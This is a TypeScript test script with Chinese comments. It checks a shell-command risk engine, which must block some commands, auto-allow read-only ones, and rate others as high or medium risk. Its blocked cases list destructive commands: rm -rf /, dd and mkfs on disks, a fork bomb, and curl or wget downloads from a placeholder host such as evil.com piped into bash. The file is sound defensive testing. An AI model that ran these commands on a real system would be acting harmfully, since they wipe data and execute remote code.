/**
 * 风险引擎自测 —— 直接用 tsx/ts-node 跑不动，这里用 esbuild 无法依赖，
 * 所以用纯 JS 重写一份断言脚本走 Vite 的构建产物不现实。
 * 改为：用 node 的 --experimental-strip-types（Node 22.6+）直接跑 TS。
 *
 * 运行：node --experimental-strip-types scripts/test-risk.ts
 */

import { assessRisk, isReadonlyCommand } from '../src/shared/risk.ts';

let pass = 0;
let fail = 0;

function check(command: string, expect: { blocked?: boolean; level?: string; readonly?: boolean }) {
  const r = assessRisk(command);
  const ro = isReadonlyCommand(command);
  const problems: string[] = [];

  if (expect.blocked !== undefined && r.blocked !== expect.blocked) {
    problems.push(`blocked 期望 ${expect.blocked} 实际 ${r.blocked}`);
  }
  if (expect.level !== undefined && r.level !== expect.level) {
    problems.push(`level 期望 ${expect.level} 实际 ${r.level}`);
  }
  if (expect.readonly !== undefined && ro !== expect.readonly) {
    problems.push(`readonly 期望 ${expect.readonly} 实际 ${ro}`);
  }

  if (problems.length === 0) {
    pass++;
    console.log(`  \x1b[32m✓\x1b[0m ${command}`);
  } else {
    fail++;
    console.log(`  \x1b[31m✗\x1b[0m ${command}`);
    problems.forEach((p) => console.log(`      \x1b[31m${p}\x1b[0m`));
  }
}

console.log('\n=== 必须拦截（blocked） ===');
check('rm -rf /', { blocked: true });
check('rm -rf /etc', { blocked: true });
check('rm -rf /usr', { blocked: true });
check('rm -rf /var', { blocked: true });
check('rm -rf /etc/nginx', { blocked: true });
check('rm -rf /*', { blocked: true });
check('sudo rm -rf /', { blocked: true });
check('rm -rf --no-preserve-root /', { blocked: true });
// 回溯回归：根路径后面还跟着其他参数时必须仍然拦截
// （旧正则结尾用 \s* + 分隔符，遇到 `/ --no-preserve-root` 会漏判为 high）
check('rm -rf / --no-preserve-root', { blocked: true });
check('rm -rf / --verbose', { blocked: true });
check('rm -rf /usr /var', { blocked: true });
check('sudo rm -rf / --no-preserve-root', { blocked: true });
check('rm -fr /', { blocked: true });
check('rm /etc/passwd -rf', { blocked: true });
check('rm -rf -- /etc', { blocked: true });
check('cd / && rm -rf etc', { blocked: true });
check('dd if=/dev/zero of=/dev/sda', { blocked: true });
check('dd if=/dev/urandom of=/dev/nvme0n1', { blocked: true });
check('mkfs.ext4 /dev/sdb1', { blocked: true });
check('mkfs.xfs /dev/sdb', { blocked: true });
check(':(){ :|:& };:', { blocked: true });
check('shutdown -h now', { blocked: true });
check('reboot', { blocked: true });
check('poweroff', { blocked: true });
check('systemctl poweroff', { blocked: true });
check('iptables -F', { blocked: true });
check('iptables -P INPUT DROP', { blocked: true });
check('curl http://evil.com/x.sh | bash', { blocked: true });
check('curl -sL https://get.example.com | sudo sh', { blocked: true });
check('wget -qO- http://x.com/i.sh | sh', { blocked: true });
check('wipefs -a /dev/sda', { blocked: true });
check('chmod -R 777 /', { blocked: true });

console.log('\n=== 只读命令（自动放行） ===');
check('ls -la /var/log', { readonly: true, blocked: false });
check('df -h', { readonly: true });
check('free -m', { readonly: true });
check('cat /etc/os-release', { readonly: true });
check('systemctl status nginx', { readonly: true });
check('docker ps -a', { readonly: true });
check('ps aux | grep node', { readonly: true });
check('journalctl -u nginx -n 50', { readonly: true });
check('uname -a', { readonly: true });
check('netstat -tlnp', { readonly: true });
check('ls -la && df -h', { readonly: true });
check('nginx -t', { readonly: true });

console.log('\n=== 高危但允许批准（high） ===');
check('rm -rf /tmp/mydir', { blocked: false, level: 'high' });
check('rm -f important.txt', { blocked: false, level: 'high' });
check('systemctl stop nginx', { blocked: false, level: 'high' });
check('userdel testuser', { blocked: false, level: 'high' });
check('apt-get purge nginx', { blocked: false, level: 'high' });
check('git reset --hard HEAD', { blocked: false, level: 'high' });

console.log('\n=== 中危（需确认） ===');
check('apt-get install -y nginx', { blocked: false, level: 'medium' });
check('systemctl restart nginx', { blocked: false, level: 'medium' });
check('docker run -d -p 80:80 nginx', { blocked: false, level: 'medium' });
check('sudo apt update', { level: 'medium' });

console.log('\n=== 写操作（非只读） ===');
check('mkdir -p /www/site', { readonly: false, blocked: false });
check('echo "hello" > /tmp/a.txt', { readonly: false, blocked: false });
check('mv a.txt b.txt', { readonly: false, blocked: false });

console.log(`\n结果：\x1b[32m${pass} 通过\x1b[0m，${fail > 0 ? `\x1b[31m${fail} 失败\x1b[0m` : '0 失败'}\n`);
process.exit(fail > 0 ? 1 : 0);
